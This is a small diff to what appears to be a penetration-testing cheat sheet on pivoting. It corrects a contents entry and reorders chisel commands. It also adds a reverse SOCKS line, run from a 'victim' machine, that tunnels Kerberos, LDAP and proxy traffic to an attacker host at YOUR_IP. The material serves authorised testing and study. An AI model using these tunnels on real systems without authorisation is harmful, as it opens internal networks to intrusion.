@@ -8,7 +8,7 @@
   * [Local Port Forwarding](#local-port-forwarding)
   * [Remote Port Forwarding](#remote-port-forwarding)
 * [Proxychains](#proxychains)
-* [Graphtcp](#graphtcp)
+* [Graftcp](#graftcp)
 * [Web SOCKS - reGeorg](#web-socks---regeorg)
 * [Web SOCKS - pivotnacci](#web-socks---pivotnacci)
 * [Metasploit](#metasploit)
@@ -232,8 +232,11 @@ $ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa"
 go get -v github.com/jpillora/chisel
 
 # forward port 389 and 88 to hacker computer
-user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
 user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
+user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
+
+# SOCKS
+user@victim$ .\chisel.exe client YOUR_IP:8008 R:socks
 ```
 
 ### SharpChisel
